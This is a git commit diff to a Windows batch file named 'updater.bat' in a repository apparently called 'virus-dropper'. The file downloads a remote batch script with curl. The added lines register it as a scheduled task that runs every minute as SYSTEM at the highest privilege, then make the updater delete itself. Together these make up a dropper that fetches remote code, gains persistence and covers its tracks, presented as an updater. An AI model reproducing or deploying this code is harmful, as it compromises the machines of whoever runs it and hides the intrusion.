396339425c4c8e069848a37666a4c0b1742eb074
YumYummity <103061664+YumYummity@users.noreply.github.com>
2022-04-28 22:11:01 -0400

    Update updater.bat

--- updater/updater.bat
+++ updater/updater.bat
@@ -1,1 +1,5 @@
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/Uninstall.bat" --output "uninstall.bat"
+SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\uninstall.bat" /TN "uninstallTEMP" /RL HIGHEST /RU SYSTEM
+call :deleteSelf&exit
+:deleteSelf
+start /b "" cmd /c del "%~f0"&exit
